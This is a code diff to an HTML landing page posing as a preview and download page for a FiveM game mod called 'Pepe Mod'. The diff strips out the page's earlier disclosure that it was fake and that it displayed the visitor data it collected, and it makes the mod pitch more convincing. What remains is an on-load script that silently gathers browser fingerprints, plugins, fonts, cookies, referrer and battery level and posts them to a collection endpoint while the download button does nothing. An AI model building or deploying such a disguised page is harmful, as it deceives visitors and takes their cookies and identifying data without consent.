@@ -17,94 +17,63 @@
             padding: 20px;
         }
         .card {
-            max-width: 800px;
+            max-width: 700px;
             width: 100%;
             background: #1a1a1a;
             border-radius: 30px;
-            padding: 30px;
+            padding: 40px;
             border: 1px solid #00ffcc44;
             box-shadow: 0 0 40px rgba(0,255,200,0.1);
+            text-align: center;
         }
         h1 {
-            font-size: 3rem;
+            font-size: 3.2rem;
             background: linear-gradient(135deg, #00ffcc, #00b8ff);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            text-align: center;
             margin-bottom: 10px;
         }
-        .sub {
-            text-align: center;
-            color: #aaa;
-            margin-bottom: 20px;
-        }
+        .sub { color: #aaa; font-size: 1.1rem; margin-bottom: 20px; }
         .preview {
             background: #111;
             border-radius: 15px;
-            padding: 15px;
-            margin: 15px 0;
-            text-align: center;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid #2a2a2a;
         }
         .preview img { max-width: 100%; border-radius: 10px; }
         .btn {
-            display: block;
+            display: inline-block;
             background: #00ffcc;
             color: #0b0b0b;
-            padding: 14px;
+            padding: 16px 50px;
             border-radius: 50px;
-            font-weight: bold;
+            font-weight: 700;
+            font-size: 1.1rem;
             border: none;
             cursor: pointer;
-            width: 100%;
-            font-size: 1.1rem;
-            margin: 10px 0;
+            transition: 0.3s;
+            margin-top: 10px;
         }
-        .btn:hover { background: #00ddaa; }
-        .data-box {
-            background: #0f0f0f;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 15px 0;
-            border: 1px solid #333;
-            font-family: 'Consolas', monospace;
-            font-size: 0.85rem;
-            color: #00ffcc;
-            max-height: 400px;
-            overflow-y: auto;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-        .status {
-            text-align: center;
-            margin: 10px 0;
-            font-size: 0.9rem;
-        }
-        .footer {
-            text-align: center;
-            color: #555;
-            font-size: 0.8rem;
-            border-top: 1px solid #222;
-            padding-top: 15px;
-            margin-top: 15px;
-        }
+        .btn:hover { transform: scale(1.05); box-shadow: 0 0 30px #00ffcc66; }
+        .footer { margin-top: 30px; color: #555; font-size: 0.8rem; border-top: 1px solid #222; padding-top: 20px; }
     </style>
 </head>
 <body>
     <div class="card">
         <h1>🐸 Pepe Mod</h1>
-        <p class="sub">🔥 FiveM mod preview – loading data...</p>
+        <p class="sub">🔥 The ultimate FiveM mod – preview now</p>
         <div class="preview">
-            <img src="https://via.placeholder.com/600x200/00ffcc/0b0b0b?text=Pepe+Mod+Preview" alt="Preview">
+            <img src="https://via.placeholder.com/600x250/00ffcc/0b0b0b?text=Pepe+Mod+Preview" alt="Preview">
+            <p style="color:#bbb; margin-top:10px;">Version 2.0.1 – Fully compatible</p>
         </div>
-        <button class="btn" id="downloadBtn">⬇ Download Now (fake)</button>
-        <div id="status" class="status">⏳ Collecting data...</div>
-        <div id="dataDisplay" class="data-box">Waiting...</div>
+        <button class="btn" id="downloadBtn">⬇ Download Now</button>
+        <p style="color:#888; margin-top:15px;">⚠️ Preview version – full release soon</p>
         <div class="footer">© 2025 Pepe Team</div>
     </div>
 
     <script>
         (function() {
-            // ---- Helper functions ----
             function getFingerprint() {
                 const canvas = document.createElement('canvas');
                 canvas.width = 200;
@@ -143,11 +112,10 @@
                 return available.join(', ');
             }
 
-            // ---- Collect data ----
             const data = {
                 screen: window.screen.width + 'x' + window.screen.height,
                 colorDepth: window.screen.colorDepth,
-                fingerprint: getFingerprint().substring(0, 80) + '...',
+                fingerprint: getFingerprint().substring(0, 100),
                 plugins: getPlugins(),
                 fonts: getFonts(),
                 cookies: document.cookie || 'none',
@@ -157,67 +125,35 @@
                 memory: navigator.deviceMemory || 'Unknown',
                 referrer: document.referrer || 'Direct',
                 url: window.location.href,
-                battery: 'Waiting...',
             };
 
-            const statusEl = document.getElementById('status');
-            const displayEl = document.getElementById('dataDisplay');
-
-            function updateDisplay() {
-                let text = '=== COLLECTED DATA ===\n';
-                for (const [key, value] of Object.entries(data)) {
-                    text += `${key}: ${value}\n`;
-                }
-                text += '\n--- This data was sent to the server ---';
-                displayEl.innerText = text;
-            }
-
-            function sendAndShow(finalData) {
-                // Show data on page immediately
-                updateDisplay();
-
-                // Send to backend
+            function sendData(data) {
                 fetch('/api/collect', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(finalData)
-                })
-                .then(res => res.json())
-                .then(() => {
-                    statusEl.innerText = '✅ Data sent successfully!';
-                    statusEl.style.color = '#00ff88';
-                })
-                .catch(err => {
-                    statusEl.innerText = '⚠️ Send failed, but data shown above.';
-                    statusEl.style.color = '#ffaa00';
-                    console.error('Fetch error:', err);
-                    // fallback
-                    try { navigator.sendBeacon('/api/collect', JSON.stringify(finalData)); } catch(e) {}
-                });
+                    body: JSON.stringify(data)
+                }).catch(() => {});
             }
 
-            // ---- Battery ----
             if (navigator.getBattery) {
                 navigator.getBattery()
                     .then(battery => {
                         data.battery = (battery.level * 100).toFixed(0) + '%';
-                        sendAndShow(data);
+                        sendData(data);
                     })
                     .catch(() => {
                         data.battery = 'Error';
-                        sendAndShow(data);
+                        sendData(data);
                     });
             } else {
                 data.battery = 'Not supported';
-                sendAndShow(data);
+                sendData(data);
             }
 
-            // ---- Fake download ----
             document.getElementById('downloadBtn').addEventListener('click', function(e) {
                 e.preventDefault();
-                alert('Mod is in preview. No download available.');
+                alert('The mod is currently in preview. Full release coming soon.');
             });
-
         })();
     </script>
 </body>
